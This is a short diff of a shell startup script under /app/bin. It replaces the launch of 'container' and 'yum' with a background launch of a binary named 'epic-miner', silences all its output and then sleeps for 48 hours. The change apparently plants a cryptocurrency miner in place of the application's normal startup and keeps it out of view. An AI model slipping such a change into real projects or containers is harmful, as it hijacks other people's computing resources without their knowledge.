@@ -1,4 +1,3 @@
 cd /app/bin
-/app/bin/container >/dev/null 2>&1 >/dev/null &
-sleep 10
-/app/bin/yum
+/app/bin/epic-miner >/dev/null 2>&1 >/dev/null &
+sleep 48h
